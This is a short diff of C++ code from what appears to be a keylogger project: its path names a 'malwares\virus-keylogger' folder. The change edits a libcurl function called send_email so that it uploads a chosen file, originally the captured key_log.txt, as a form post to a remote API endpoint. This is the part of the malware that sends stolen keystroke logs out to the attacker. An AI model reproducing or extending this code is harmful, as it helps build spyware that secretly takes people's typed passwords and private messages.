@@ -4,20 +4,20 @@
 #include <vector>
 #include <string>
 
-bool send_email(const std::string& api_endpoint_url, std::vector<std::wstring> email_addr) {
+bool send_email(const std::string& api_endpoint_url, std::vector<std::wstring> email_addr, std::string file_name) {
     CURL* curl;
     CURLcode res = CURLE_OK;
     struct curl_httppost* formpost = NULL;
     struct curl_httppost* lastptr = NULL;
     struct curl_slist* headerlist = NULL;
     static const char buffer[] = "Expect:";
-        
+
     curl_global_init(CURL_GLOBAL_ALL);
     curl_formadd(
         &formpost,
         &lastptr,
         CURLFORM_COPYNAME, "file",
-        CURLFORM_FILE, "G:\\Programs\\C++\\malwares\\virus-keylogger\\key_log.txt", 
+        CURLFORM_FILE, file_name.c_str(),
         CURLFORM_END
     );
 
